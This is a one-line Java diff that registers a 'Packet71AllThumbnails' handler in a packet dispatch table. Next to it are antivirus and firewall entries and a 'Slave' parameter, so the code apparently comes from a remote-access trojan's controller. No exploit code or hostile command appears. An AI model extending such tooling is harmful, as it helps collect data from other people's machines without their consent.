@@ -83,6 +83,7 @@ public class IncomingPackets {
 		// TODO 68 free
 		incomingPackets.put((byte) 69, Packet69InitAntivirus.class);
 		incomingPackets.put((byte) 70, Packet70InitFirewall.class);
+		incomingPackets.put((byte) 71, Packet71AllThumbnails.class);
 	}
 
 	public static boolean execute(byte header, Slave slave) {
